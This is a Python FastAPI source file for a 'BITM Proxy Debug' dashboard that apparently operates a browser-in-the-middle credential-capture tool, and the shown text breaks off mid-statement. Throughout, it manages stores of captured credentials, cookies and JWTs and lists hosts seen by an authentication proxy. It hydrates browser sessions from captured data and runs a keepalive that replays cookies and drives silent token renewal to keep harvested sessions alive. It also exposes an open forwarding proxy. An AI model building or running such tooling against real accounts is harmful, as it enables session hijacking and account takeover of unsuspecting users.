"""Debug dashboard — runs on port 8092.

Single bidirectional WebSocket replaces all HTTP polling.
Server pushes: logs, config changes, session changes, captured data.
Client sends: config updates, saved session CRUD, credential actions.
"""

import asyncio
import json
import uuid
import time as _time
from pathlib import Path

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
from fastapi.responses import HTMLResponse

from backend.shared import (
    get_logs, subscribe, unsubscribe,
    get_config, update_config,
    get_active_sessions, append_log,
    get_log_file_info,
    list_session_logs, read_session_log,
    get_current_jwts,
    get_flow, clear_flow,
)
from backend.store import JsonStore
from backend.paths import screenshots_dir as _get_screenshots_dir
from backend.routes.sessions import store as saved_sessions_store

from backend.auth_proxy import (
    start_auth_proxy, stop_auth_proxy, get_auth_proxy_status,
)
from backend.keepalive import (
    start_keepalive, stop_keepalive, get_keepalive_status, get_keepalive_log,
)

from backend.auth import APIKeyMiddleware, verify_ws_key
from backend.routes import browser as browser_routes
from backend.routes import devices as devices_routes
from backend.routes import phantom as phantom_routes
from backend.routes import capture as capture_routes

credentials_store = JsonStore("credentials")
cookies_store = JsonStore("cookies")

app = FastAPI(title="BITM Proxy Debug", version="1.47.0")

app.add_middleware(APIKeyMiddleware)
app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
app.include_router(devices_routes.router, prefix="/api/devices", tags=["devices"])
app.include_router(phantom_routes.router, prefix="/api/phantom", tags=["phantom"])
app.include_router(capture_routes.router, prefix="/api/capture", tags=["capture"])


# ── Test Proxy ──────────────────────────────────────────────

_proxy_server: asyncio.AbstractServer | None = None
_proxy_request_count = 0


async def _handle_proxy_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """Handle one proxy connection (HTTP or CONNECT tunnel)."""
    global _proxy_request_count
    try:
        request_line = await asyncio.wait_for(reader.readline(), timeout=10)
        if not request_line:
            writer.close()
            return
        request_str = request_line.decode(errors="replace").strip()
        _proxy_request_count += 1

        parts = request_str.split()
        if len(parts) < 3:
            writer.close()
            return

        method, target, _ = parts[0], parts[1], parts[2]

        if method == "CONNECT":
            # HTTPS tunnel
            host_port = target.split(":")
            host = host_port[0]
            port = int(host_port[1]) if len(host_port) > 1 else 443

            # Read remaining headers
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=5)
                if line in (b"\r\n", b"\n", b""):
                    break

            append_log("info", "proxy", f"CONNECT {host}:{port}")
            try:
                remote_reader, remote_writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=10)
            except Exception as e:
                append_log("warn", "proxy", f"CONNECT failed {host}:{port} — {e}")
                writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                await writer.drain()
                writer.close()
                return

            writer.write(b"HTTP/1.1 200 Connection established\r\n\r\n")
            await writer.drain()

            # Bidirectional pipe
            async def pipe(src, dst):
                try:
                    while True:
                        data = await src.read(65536)
                        if not data:
                            break
                        dst.write(data)
                        await dst.drain()
                except Exception:
                    pass

            await asyncio.gather(pipe(reader, remote_writer), pipe(remote_reader, writer))
            remote_writer.close()

        else:
            # Plain HTTP — forward the request
            # Parse host from URL or Host header
            from urllib.parse import urlparse
            parsed = urlparse(target)
            host = parsed.hostname or ""
            port = parsed.port or 80

            # Read all headers
            headers_raw = request_line
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=5)
                headers_raw += line
                if line in (b"\r\n", b"\n", b""):
                    break

            append_log("info", "proxy", f"{method} {target}")
            try:
                remote_reader, remote_writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port), timeout=10)
            except Exception as e:
                append_log("warn", "proxy", f"Connection failed {host}:{port} — {e}")
                writer.write(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
                await writer.drain()
                writer.close()
                return

            remote_writer.write(headers_raw)
            await remote_writer.drain()

            # Stream response back
            try:
                while True:
                    data = await remote_reader.read(65536)
                    if not data:
                        break
                    writer.write(data)
                    await writer.drain()
            except Exception:
                pass
            remote_writer.close()

    except Exception as e:
        append_log("warn", "proxy", f"Proxy error: {e}")
    finally:
        try:
            writer.close()
        except Exception:
            pass


async def start_test_proxy(port: int = 3129) -> dict:
    global _proxy_server, _proxy_request_count
    if _proxy_server is not None:
        return {"running": True, "port": port, "message": "Already running"}
    _proxy_request_count = 0
    _proxy_server = await asyncio.start_server(_handle_proxy_client, "0.0.0.0", port)
    append_log("info", "proxy", f"Test proxy started on :{port}")
    return {"running": True, "port": port}


async def stop_test_proxy() -> dict:
    global _proxy_server
    if _proxy_server is None:
        return {"running": False, "message": "Not running"}
    _proxy_server.close()
    await _proxy_server.wait_closed()
    _proxy_server = None
    append_log("info", "proxy", "Test proxy stopped")
    return {"running": False}


def get_proxy_status() -> dict:
    return {
        "running": _proxy_server is not None,
        "request_count": _proxy_request_count,
    }


async def test_upstream_proxy() -> dict:
    """Test connectivity to the configured upstream proxy.

    Steps:
    1. TCP connect to the proxy host:port
    2. Send an HTTP CONNECT to example.com:443 through it
    3. Report results for each step
    """
    from backend.shared import get_config_value
    host_str = get_config_value("upstream_proxy_host", "host.docker.internal:3128")
    # Parse scheme so we can probe the correct handshake. Playwright speaks
    # http/https/socks4/socks4a/socks5/socks5h; we treat everything non-
    # socks* as HTTP for the probe.
    scheme = "http"
    for s in ("socks5h://", "socks5://", "socks4a://", "socks4://",
              "https://", "http://"):
        if host_str.startswith(s):
            scheme = s.rstrip("://").rstrip(":/")
            host_str = host_str[len(s):]
            break
    host_str = host_str.rstrip("/")

    parts = host_str.rsplit(":", 1)
    host = parts[0]
    try:
        port = int(parts[1]) if len(parts) > 1 else 3128
    except ValueError:
        port = 3128

    results = {"host": host, "port": port, "scheme": scheme, "steps": []}

    # Step 1: DNS resolve
    import socket
    try:
        addrs = socket.getaddrinfo(host, port, socket.AF_UNSPEC, socket.SOCK_STREAM)
        ip = addrs[0][4][0] if addrs else "?"
        results["steps"].append({"name": "DNS resolve", "ok": True, "detail": f"{host} -> {ip}"})
    except Exception as e:
        results["steps"].append({"name": "DNS resolve", "ok": False, "detail": str(e)})
        results["ok"] = False
        append_log("warn", "proxy", f"Proxy test FAILED: DNS resolve {host} — {e}")
        return results

    # Step 2: TCP connect
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(host, port), timeout=5)
        results["steps"].append({"name": "TCP connect", "ok": True, "detail": f"{host}:{port}"})
    except Exception as e:
        results["steps"].append({"name": "TCP connect", "ok": False, "detail": str(e)})
        results["ok"] = False
        append_log("warn", "proxy", f"Proxy test FAILED: TCP connect {host}:{port} — {e}")
        return results

    # Step 3: protocol handshake — HTTP CONNECT for http(s), SOCKS5
    # greeting for socks5(h). SOCKS4 gets TCP-connect-only (hand-rolling
    # a SOCKS4 BIND probe isn't worth the complexity for a settings test).
    try:
        if scheme in ("socks5", "socks5h"):
            # SOCKS5 no-auth greeting: [ver=5][nmethods=1][method=0(no-auth)]
            writer.write(b"\x05\x01\x00")
            await writer.drain()
            reply = await asyncio.wait_for(reader.readexactly(2), timeout=5)
            ok = reply[:1] == b"\x05" and reply[1:2] in (b"\x00", b"\x02")
            method = {0: "no-auth", 2: "user/pass",
                      0xff: "no acceptable methods"}.get(reply[1],
                                                         f"method=0x{reply[1]:02x}")
            results["steps"].append({
                "name": "SOCKS5 greeting",
                "ok": ok,
                "detail": f"server chose {method}",
            })
            if reply[1:2] == b"\x02":
                # Chromium won't auth on SOCKS5 — call it out.
                results["steps"].append({
                    "name": "SOCKS5 auth hint", "ok": False,
                    "detail": "Server requires user/pass auth — "
                              "Chromium ignores SOCKS5 credentials. "
                              "Front with an authed HTTP proxy instead.",
                })
        elif scheme == "socks4" or scheme == "socks4a":
            # TCP connect already succeeded above — SOCKS4 negotiation is
            # per-destination so we skip it here.
            results["steps"].append({
                "name": "SOCKS4 reachability",
                "ok": True,
                "detail": "TCP-only probe (SOCKS4 negotiates per-destination)",
            })
        else:
            writer.write(b"CONNECT example.com:443 HTTP/1.1\r\n"
                         b"Host: example.com:443\r\n\r\n")
            await writer.drain()
            response = await asyncio.wait_for(reader.readline(), timeout=5)
            resp_str = response.decode(errors="replace").strip()
            ok = "200" in resp_str
            results["steps"].append({"name": "CONNECT handshake",
                                     "ok": ok, "detail": resp_str})
            try:
                while True:
                    line = await asyncio.wait_for(reader.readline(), timeout=1)
                    if line in (b"\r\n", b"\n", b""):
                        break
            except Exception:
                pass
    except Exception as e:
        results["steps"].append({"name": f"{scheme} handshake", "ok": False,
                                 "detail": str(e)})
    finally:
        writer.close()

    results["ok"] = all(s["ok"] for s in results["steps"])
    status = "PASS" if results["ok"] else "FAIL"
    append_log("info", "proxy",
               f"Proxy test {status}: {host}:{port} — " +
               ", ".join(f"{s['name']}={'OK' if s['ok'] else 'FAIL'}" for s in results["steps"]))
    return results


@app.get("/", response_class=HTMLResponse)
async def dashboard():
    from fastapi import Response
    # Inject the running app version at serve time (DASHBOARD_HTML is a
    # static constant). Placeholder is shown on the Diagnostics pane.
    html = DASHBOARD_HTML.replace("__APP_VERSION__", app.version)
    return Response(
        content=html, media_type="text/html; charset=utf-8",
        # Short cache — lets reconnecting dashboards skip the 200 KB HTML
        # re-download, but still pulls fresh after a deploy in < 60 s.
        headers={"Cache-Control": "public, max-age=60"},
    )


@app.get("/api/metrics")
async def api_metrics():
    """Lightweight counters for perf investigations (not Prometheus-format
    on purpose; this is a dev-facing JSON snapshot)."""
    from backend.shared import get_bus_metrics, get_active_sessions
    import os as _os
    rss = 0
    try:
        import resource
        rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
        # ru_maxrss is in KB on Linux, bytes on macOS — normalise to bytes.
        if _os.uname().sysname != "Darwin":
            rss *= 1024
    except Exception:
        pass
    pool = None
    try:
        from backend.worker.dispatcher import get_dispatcher
        d = get_dispatcher()
        if d is not None:
            pool = d.snapshot()
    except Exception:
        pool = None
    return {
        "pid": _os.getpid(),
        "rss_bytes": rss,
        "bus": get_bus_metrics(),
        "active_sessions": len(get_active_sessions()),
        "pool": pool,
        "ts": _time.time(),
    }


# Silence the "GET /favicon.ico 404" noise browsers produce on every load.
# Inline SVG with a proxy-arrow glyph so the tab actually gets an icon.
_FAVICON_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">'
    b'<rect width="32" height="32" rx="6" fill="#0ea5e9"/>'
    b'<path d="M7 16h12m0 0-4-4m4 4-4 4" stroke="#0a0a14" '
    b'stroke-width="3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>'
    b'</svg>'
)


@app.get("/favicon.ico")
@app.get("/favicon.svg")
async def favicon():
    from fastapi import Response
    return Response(content=_FAVICON_SVG, media_type="image/svg+xml",
                    headers={"Cache-Control": "public, max-age=86400"})


@app.websocket("/ws/control")
async def ws_control(ws: WebSocket):
    """Control socket — config, saved sessions, credentials CRUD.
    Pushes: config changes, session changes, saved_sessions, sites.
    Receives: commands (update_config, create/delete saved sessions, etc.)
    """
    # Diag breadcrumb BEFORE auth/accept so even rejected or hung
    # upgrades show up in /api/diag's log buffer. If the dashboard
    # reports CONNECTING and no entry like this exists, the upgrade
    # request never reached the FastAPI app (proxy/CORS/network).
    try:
        peer = f"{ws.client.host}:{ws.client.port}" if ws.client else "?"
        append_log("info", "ws_ctrl",
                   f"WS_CTRL_OPEN peer={peer} "
                   f"hdrs={'upgrade' in (ws.headers.get('connection','').lower())}")
    except Exception:
        pass
    if not verify_ws_key(ws):
        try: append_log("warn", "ws_ctrl", "WS_CTRL_REJECT reason=invalid_api_key")
        except Exception: pass
        await ws.close(code=4001, reason="Invalid or missing API key")
        return
    await ws.accept()
    try: append_log("info", "ws_ctrl", "WS_CTRL_ACCEPTED")
    except Exception: pass
    # Hello-first: tell the client the connection is live BEFORE
    # building the (potentially expensive) init payload. If init
    # composition hangs (huge credentials store, slow disk, locked
    # JsonStore, blocked event loop), the client at least transitions
    # past CONNECTING and can render an error or fallback rather
    # than spinning forever.
    try:
        await ws.send_json({"type": "hello", "ts": _time.time()})
    except Exception:
        return
    q = subscribe()

    # Send initial state (no logs — those go on /ws/data). Each
    # field is collected behind a try/except so a failure in one
    # collector (e.g. credentials_store decryption error) doesn't
    # blank out the whole init.
    init_payload: dict = {"type": "init"}
    def _safe(name: str, fn):
        try:
            init_payload[name] = fn()
        except Exception as e:
            init_payload[name] = None
            init_payload.setdefault("init_errors", []).append(
                f"{name}: {type(e).__name__}: {e}")
    _safe("config", get_config)
    _safe("sessions", get_active_sessions)
    _safe("flow_sessions", _flow_session_summaries)
    _safe("saved_sessions", saved_sessions_store.list_all)
    _safe("sites", lambda: [
        {"id": k, "data": credentials_store.get(k)}
        for k in credentials_store.list_keys()
    ])
    _safe("proxy_status", get_proxy_status)
    _safe("auth_proxy_status", get_auth_proxy_status)
    _safe("keepalive_status", get_keepalive_status)
    _safe("log_file_info", get_log_file_info)
    await ws.send_json(init_payload)

    async def push_loop():
        try:
            while True:
                event = await q.get()
                # Only forward non-log events on the control socket
                if event.get("type") in ("config", "sessions", "keepalive_status", "keepalive_log"):
                    await ws.send_json(event)
                elif event.get("type") == "sites_changed":
                    # Refresh sites data and push to client
                    sites = [{"id": k, "data": credentials_store.get(k)}
                             for k in credentials_store.list_keys()]
                    await ws.send_json({"type": "sites", "sites": sites})
        except Exception:
            pass

    push_task = asyncio.create_task(push_loop())

    try:
        while True:
            raw = await ws.receive_text()
            msg = json.loads(raw)
            cmd = msg.get("cmd")

            if cmd == "update_config":
                result = update_config(msg.get("data", {}))
                await ws.send_json({"type": "config", "config": result})

            elif cmd == "get_config":
                await ws.send_json({"type": "config", "config": get_config()})

            elif cmd == "get_sessions":
                await ws.send_json({"type": "sessions", "sessions": get_active_sessions()})

            elif cmd == "get_saved_sessions":
                await ws.send_json({"type": "saved_sessions", "data": saved_sessions_store.list_all()})

            elif cmd == "create_saved_session":
                sid = str(uuid.uuid4())[:8]
                data = {"id": sid, "name": msg.get("name", ""),
                        "login_url": msg.get("login_url", ""),
                        "notes": msg.get("notes", ""),
                        "created_at": _time.time()}
                saved_sessions_store.put(sid, data)
                await ws.send_json({"type": "saved_sessions", "data": saved_sessions_store.list_all()})

            elif cmd == "delete_saved_session":
                saved_sessions_store.delete(msg.get("id", ""))
                await ws.send_json({"type": "saved_sessions", "data": saved_sessions_store.list_all()})

            elif cmd == "get_sites":
                sites = [{"id": k, "data": credentials_store.get(k)}
                         for k in credentials_store.list_keys()]
                await ws.send_json({"type": "sites", "sites": sites})

            elif cmd == "trim_old_tokens":
                # Drop the N-oldest token entries from a site's
                # credentials record, keeping only the most recent
                # `keep`. Captured headers + cookies are unaffected;
                # only the `tokens` array is trimmed.
                site_id = msg.get("site_id", "")
                keep = max(1, int(msg.get("keep", 6)))
                try:
                    data = credentials_store.get(site_id) or {}
                    tokens = data.get("tokens") or []
                    before = len(tokens)
                    tokens.sort(key=lambda t: t.get("captured_at", 0),
                                 reverse=True)
                    data["tokens"] = tokens[:keep]
                    credentials_store.put(site_id, data)
                    from backend.shared import notify_sites_changed
                    notify_sites_changed()
                    await ws.send_json({
                        "type": "trim_tokens_result",
                        "site_id": site_id,
                        "before": before, "after": len(data["tokens"])})
                except Exception as e:
                    await ws.send_json({
                        "type": "trim_tokens_result",
                        "site_id": site_id, "error": str(e)})

            elif cmd == "delete_credentials":
                site_id = msg.get("site_id", "")
                credentials_store.delete(site_id)
                cookies_store.delete(site_id)
                sites = [{"id": k, "data": credentials_store.get(k)}
                         for k in credentials_store.list_keys()]
                await ws.send_json({"type": "sites", "sites": sites})

            elif cmd == "refresh_sites":
                sites = [{"id": k, "data": credentials_store.get(k)}
                         for k in credentials_store.list_keys()]
                await ws.send_json({"type": "sites", "sites": sites})

            elif cmd == "get_current_jwts":
                await ws.send_json({"type": "current_jwts", "data": get_current_jwts()})

            elif cmd == "get_session_logs":
                await ws.send_json({"type": "session_logs", "data": list_session_logs()})

            elif cmd == "list_subsessions":
                from backend import subsessions as _subs
                await ws.send_json({"type": "subsessions",
                                    "data": _subs.list_subsessions()})

            elif cmd == "delete_subsession":
                from backend import subsessions as _subs
                ok = _subs.delete_subsession(msg.get("sid", ""))
                await ws.send_json({"type": "subsessions",
                                    "data": _subs.list_subsessions()})

            elif cmd == "debug_dump_dom":
                sid = msg.get("session_id", "")
                try:
                    from backend.routes.browser import debug_dump_dom as _d
                    result = await _d(sid)
                    await ws.send_json({"type": "debug_dom", "session_id": sid, **result})
                except Exception as e:
                    await ws.send_json({"type": "debug_dom", "session_id": sid,
                                        "ok": False, "error": str(e)})

            elif cmd == "debug_list_frames":
                sid = msg.get("session_id", "")
                try:
                    from backend.routes.browser import debug_list_frames as _d
                    result = await _d(sid)
                    await ws.send_json({"type": "debug_frames", "session_id": sid, **result})
                except Exception as e:
                    await ws.send_json({"type": "debug_frames", "session_id": sid,
                                        "ok": False, "error": str(e)})

            elif cmd == "debug_export_flow":
                sid = msg.get("session_id", "")
                fmt = str(msg.get("format", "json")).lower()
                try:
                    from backend.routes.browser import debug_export_flow as _d
                    result = await _d(sid, fmt=fmt)
                    await ws.send_json({"type": "debug_flow_export", "session_id": sid, **result})
                except Exception as e:
                    await ws.send_json({"type": "debug_flow_export", "session_id": sid,
                                        "ok": False, "error": str(e)})

            elif cmd == "client_log":
                # Dashboard-initiated log entry so user actions show up in the
                # shared log buffer (and the file logger if enabled).
                lvl = str(msg.get("level", "info"))
                cat = str(msg.get("category", "client"))[:32] or "client"
                text = str(msg.get("message", ""))[:800]
                sid = str(msg.get("session_id", "") or "")
                append_log(lvl, cat, text, session_id=sid)

            elif cmd == "list_host_captures":
                from backend import host_captures as _hc
                await ws.send_json({"type": "host_captures",
                                    "data": _hc.list_hosts()})

            elif cmd == "get_host_capture":
                from backend import host_captures as _hc
                host = msg.get("host", "")
                await ws.send_json({"type": "host_capture_detail",
                                    "host": host,
                                    "data": _hc.get_host(host)})

            elif cmd == "delete_host_capture":
                from backend import host_captures as _hc
                _hc.delete_host(msg.get("host", ""))
                await ws.send_json({"type": "host_captures",
                                    "data": _hc.list_hosts()})

            elif cmd == "clear_all_sensitive":
                import shutil
                from backend import subsessions as _subs
                from backend import host_captures as _hc
                c1 = credentials_store.clear_all()
                c2 = cookies_store.clear_all()
                _subs.clear_all_subsessions()
                _hc.clear_all()
                # Clear screenshots
                screenshots_dir = _get_screenshots_dir()
                s_count = 0
                if screenshots_dir.exists():
                    for d in screenshots_dir.iterdir():
                        if d.is_dir():
                            shutil.rmtree(d)
                            s_count += 1
                # Clear auto_login_email
                update_config({"auto_login_email": ""})
                # Also wipe the dashboard's view of sessions — "clear all"
                # users expect no lingering entries in the tabs/dropdowns.
                # get_active_sessions is already imported at module scope.
                active_now = set(get_active_sessions().keys())
                append_log("info", "config",
                           f"CLEARED ALL SENSITIVE DATA: {c1} credential files, "
                           f"{c2} cookie files, {s_count} screenshot dirs. "
                           f"{len(active_now)} session(s) still live on backend.")
                await ws.send_json({"type": "sites", "sites": []})
                await ws.send_json({"type": "config", "config": get_config()})
                # Ask the dashboard to drop any session rows it's remembering
                # that are no longer live (ended sessions persist client-side
                # only). Clients pick this up in the 'sessions_pruned' handler.
                await ws.send_json({"type": "sessions_pruned",
                                    "keep": list(active_now)})

            elif cmd == "start_test_proxy":
                port = int(msg.get("port", 3129))
                result = await start_test_proxy(port)
                await ws.send_json({"type": "proxy_status", **result})

            elif cmd == "stop_test_proxy":
                result = await stop_test_proxy()
                await ws.send_json({"type": "proxy_status", **result})

            elif cmd == "get_proxy_status":
                await ws.send_json({"type": "proxy_status", **get_proxy_status()})

            elif cmd == "test_proxy_connection":
                result = await test_upstream_proxy()
                await ws.send_json({"type": "proxy_test", **result})

            elif cmd == "start_auth_proxy":
                port = int(msg.get("port", 3128))
                result = await start_auth_proxy(port)
                await ws.send_json({"type": "auth_proxy_status", **result})

            elif cmd == "stop_auth_proxy":
                result = await stop_auth_proxy()
                await ws.send_json({"type": "auth_proxy_status", **result})

            elif cmd == "get_auth_proxy_status":
                await ws.send_json({"type": "auth_proxy_status",
                                    **get_auth_proxy_status()})

            elif cmd == "start_keepalive":
                result = await start_keepalive()
                await ws.send_json({"type": "keepalive_status", **result})

            elif cmd == "stop_keepalive":
                result = await stop_keepalive()
                await ws.send_json({"type": "keepalive_status", **result})

            elif cmd == "get_keepalive_status":
                await ws.send_json({"type": "keepalive_status",
                                    **get_keepalive_status()})

            elif cmd == "keepalive_pw_refresh_now":
                # Operator-driven Playwright refresh — bypasses the
                # global fallback toggle. One-shot test from the
                # Debug panel: spin a context in the dedicated
                # browser, drive the SPA's silent-renewal, persist
                # the resulting token if any.
                site_id = msg.get("site_id", "")
                try:
                    from backend.keepalive import pw_refresh_now
                    result = await pw_refresh_now(site_id)
                    await ws.send_json({
                        "type": "keepalive_pw_refresh_result",
                        "site_id": site_id, **result})
                except Exception as e:
                    import traceback
                    await ws.send_json({
                        "type": "keepalive_pw_refresh_result",
                        "site_id": site_id, "ok": False,
                        "error": str(e),
                        "traceback": traceback.format_exc()[:2000]})

            elif cmd == "keepalive_resume":
                site_id = msg.get("site_id", "")
                try:
                    from backend.keepalive import resume_site
                    ok = resume_site(site_id)
                    await ws.send_json({"type": "keepalive_resume_result",
                                        "site_id": site_id, "ok": ok})
                except Exception as e:
                    await ws.send_json({"type": "keepalive_resume_result",
                                        "site_id": site_id, "ok": False,
                                        "error": str(e)})

            elif cmd == "keepalive_diagnose":
                # Per-row Debug button — runs a fast token-decode +
                # captured-state pass by default. Operator opts into
                # the slow Graph /me + cookie-replay round-trips via
                # `include_remote` / `include_reauth` flags. Keeps
                # the first click sub-second.
                site_id = msg.get("site_id", "")
                include_remote = bool(msg.get("include_remote", False))
                include_reauth = bool(msg.get("include_reauth", False))
                try:
                    from backend.keepalive import diagnose_site
                    result = await diagnose_site(
                        site_id,
                        include_remote=include_remote,
                        include_reauth=include_reauth,
                    )
                    await ws.send_json({"type": "keepalive_diagnose_result",
                                        "site_id": site_id,
                                        **result})
                except Exception as e:
                    import traceback
                    await ws.send_json({"type": "keepalive_diagnose_result",
                                        "site_id": site_id,
                                        "ok": False,
                                        "error": str(e),
                                        "traceback": traceback.format_exc()[:2000]})

            elif cmd == "get_keepalive_log":
                await ws.send_json({"type": "keepalive_log_history",
                                    "entries": get_keepalive_log()})

            elif cmd == "get_log_file_info":
                await ws.send_json({"type": "log_file_info",
                                    **get_log_file_info()})

            elif cmd == "get_flow":
                sid = msg.get("session_id", "")
                entries = list(get_flow(sid))
                # Retro-tag any entries missing auth_milestones (those
                # captured before the classifier shipped or before the
                # session's first request finished). Idempotent — runs
                # only on first read or after `cmd:'reclassify_flow'`.
                try:
                    from backend import auth_milestones as _am
                    for e in entries:
                        if "auth_milestones" in e:
                            continue
                        tags = _am.classify(e)
                        if tags:
                            e["auth_milestones"] = tags
                except Exception as _e:
                    append_log("warn", "flow",
                               f"retro auth_milestones classify failed: {_e}")
                await ws.send_json({"type": "flow_history",
                                    "session_id": sid,
                                    "entries": entries})

            elif cmd == "reclassify_flow":
                sid = msg.get("session_id", "")
                from backend import auth_milestones as _am
                from backend import site_rules as _sr
                cfg = _sr.auth_milestones_config()
                tagged = 0
                cleared = 0
                kind_counts: dict[str, int] = {}
                with_resp_body = 0
                with_req_body = 0
                token_endpoint_hits = 0
                idp_host_hits = 0
                token_re = cfg["token_path_re"]
                from urllib.parse import urlparse as _urlparse
                idp_hosts = cfg["idp_hosts"]
                samples: list[dict] = []
                for e in get_flow(sid):
                    e.pop("auth_milestones", None)
                    cleared += 1
                    if e.get("response_body"):
                        with_resp_body += 1
                    if e.get("request_body"):
                        with_req_body += 1
                    try:
                        path = _urlparse(e.get("url") or "").path or ""
                        host = (_urlparse(e.get("url") or "").hostname
                                or "").lower()
                    except Exception:
                        path = ""; host = ""
                    if token_re and token_re.search(path):
                        token_endpoint_hits += 1
                    if any(host == h or host.endswith("." + h)
                           for h in idp_hosts):
                        idp_host_hits += 1
                    tags = _am.classify(e)
                    if tags:
                        e["auth_milestones"] = tags
                        tagged += 1
                        for t in tags:
                            kind_counts[t["kind"]] = (
                                kind_counts.get(t["kind"], 0) + 1)
                    elif (token_re and token_re.search(path)
                            and len(samples) < 3):
                        # First few token-endpoint rows that DIDN'T tag
                        # — surface the shape so we can see why.
                        rb = (e.get("request_body") or "")[:200]
                        rsp = (e.get("response_body") or "")[:200]
                        samples.append({
                            "seq": e.get("seq"),
                            "method": e.get("method"),
                            "url": (e.get("url") or "")[:150],
                            "status": e.get("status"),
                            "req_body": rb,
                            "resp_body": rsp,
                        })
                diagnostics = {
                    "session_id": sid,
                    "tagged": tagged,
                    "cleared": cleared,
                    "kinds": kind_counts,
                    "with_req_body": with_req_body,
                    "with_resp_body": with_resp_body,
                    "token_endpoint_hits": token_endpoint_hits,
                    "idp_host_hits": idp_host_hits,
                    "yaml_idp_host_count": len(idp_hosts),
                    "yaml_token_re_compiled": bool(token_re),
                    "yaml_login_re_compiled": bool(cfg.get("login_path_re")),
                    "yaml_session_cookie_count": len(
                        cfg.get("session_cookie_names") or []),
                    "samples": samples,
                }
                await ws.send_json({"type": "flow_history",
                                    "session_id": sid,
                                    "entries": list(get_flow(sid)),
                                    "reclassify": diagnostics})
                summary = (f"reclassify_flow sid={sid} "
                           f"tagged={tagged}/{cleared} "
                           f"kinds={kind_counts} "
                           f"req_body={with_req_body} "
                           f"resp_body={with_resp_body} "
                           f"token_paths={token_endpoint_hits} "
                           f"idp_hosts={idp_host_hits} "
                           f"yaml_idp_host_count={len(idp_hosts)} "
                           f"yaml_token_re="
                           f"{'yes' if token_re else 'NO'}")
                # Mirror to stdout so journalctl / docker logs surface
                # it without the operator having to filter the dashboard
                # log buffer for the right category. The dashboard's
                # WS path also gets a structured `reclassify` field in
                # the flow_history reply so the UI can render the same
                # info inline.
                print(f"[FLOW] {summary}", flush=True)
                append_log("info", "flow", summary, session_id=sid)
                if samples:
                    for s in samples:
                        line = (f"reclassify untagged token-path "
                                f"#{s['seq']} {s['method']} {s['url']} "
                                f"-> {s['status']} "
                                f"req={s['req_body']!r} "
                                f"resp={s['resp_body']!r}")
                        print(f"[FLOW] {line}", flush=True)
                        append_log("warn", "flow", line, session_id=sid)

            elif cmd == "clear_flow":
                sid = msg.get("session_id", "")
                clear_flow(sid)
                await ws.send_json({"type": "flow_cleared", "session_id": sid})

            elif cmd == "submit_flow_to_rag":
                sid = msg.get("session_id", "")
                start_seq = msg.get("start_seq")
                end_seq = msg.get("end_seq")
                seqs = msg.get("seqs")
                try:
                    from backend.rag_bridge import submit_flow_as_finding
                    result = await submit_flow_as_finding(
                        sid, start_seq=start_seq, end_seq=end_seq, seqs=seqs)
                    await ws.send_json({"type": "rag_submit_result", **result})
                except Exception as e:
                    await ws.send_json({"type": "rag_submit_result",
                                        "ok": False, "error": str(e)})

            elif cmd == "clear_rag_findings":
                # Clear only the explicitly-imported findings (the "Send to
                # RAG" set) from the built-in RAG store. Captured flow traces
                # are untouched — they still auto-surface as findings.
                try:
                    from backend.rag_api import clear_imported_findings
                    n = clear_imported_findings()
                    await ws.send_json({"type": "rag_cleared",
                                        "ok": True, "cleared": n})
                except Exception as e:
                    await ws.send_json({"type": "rag_cleared",
                                        "ok": False, "error": str(e)})

            elif cmd == "run_diagnostics":
                try:
                    from backend.diagnostics import run_all_checks
                    results = await run_all_checks()
                    await ws.send_json({"type": "diagnostics_result",
                                        "checks": results,
                                        "ran_at": _time.time()})
                except Exception as e:
                    await ws.send_json({"type": "diagnostics_result",
                                        "error": str(e),
                                        "checks": []})

            elif cmd == "list_captured_proxy":
                from backend.auth_proxy import list_captured_hostnames
                await ws.send_json({"type": "captured_proxy_list",
                                    "hosts": list_captured_hostnames()})

            elif cmd == "hydrate_session":
                sid = msg.get("session_id", "")
                host = msg.get("hostname", "")
                navigate = bool(msg.get("navigate", True))
                try:
                    from backend.routes.browser import hydrate_session as _hs
                    result = await _hs(sid, host, navigate=navigate)
                    await ws.send_json({"type": "hydrate_result", **result,
                                        "session_id": sid})
                except Exception as e:
                    await ws.send_json({"type": "hydrate_result",
                                        "ok": False, "error": str(e),
                                        "session_id": sid})

            elif cmd == "list_devices":
                from backend import devices as _devices
                await ws.send_json({"type": "devices_list",
                                    "devices": _devices.list_all()})

            elif cmd == "get_device":
                from backend import devices as _devices
                rec = _devices.get(msg.get("device_id", ""))
                await ws.send_json({"type": "device", "device": rec})

            elif cmd == "register_device_from_capture":
                from backend import devices as _devices
                host = msg.get("hostname", "")
                modes = list(msg.get("modes") or [])
                sites = msg.get("sites") or None
                name = msg.get("name") or None
                try:
                    rec = _devices.register_from_capture(
                        host, modes, sites=sites, name=name)
                    pending = _devices.get_pending_probe(host)
                    await ws.send_json({
                        "type": "device_registered",
                        "device": rec,
                        "probe_token": (pending or {}).get("token"),
                        "probe_url": (f"https://{host}/" if pending
                                       else None),
                    })
                except Exception as e:
                    await ws.send_json({"type": "device_registered",
                                        "ok": False, "error": str(e)})

            elif cmd == "register_device_manual":
                from backend import devices as _devices
                try:
                    rec = _devices.register_manual(msg.get("profile") or {})
                    await ws.send_json({"type": "device_registered",
                                        "device": rec})
                except Exception as e:
                    await ws.send_json({"type": "device_registered",
                                        "ok": False, "error": str(e)})

            elif cmd == "register_device_from_session":
                from backend import devices as _devices
                from backend.routes.browser import _live_pages
                sid = msg.get("session_id", "")
                modes = list(msg.get("modes") or ["passive"])
                name = msg.get("name") or None
                sites = msg.get("sites") or None
                page = _live_pages.get(sid)
                if page is None:
                    await ws.send_json({
                        "type": "device_registered", "ok": False,
                        "error": f"no live session {sid}"})
                else:
                    try:
                        rec = await _devices.register_from_session(
                            page, modes, name=name, sites_filter=sites)
                        await ws.send_json({"type": "device_registered",
                                            "device": rec,
                                            "from_session": sid})
                    except Exception as e:
                        await ws.send_json({"type": "device_registered",
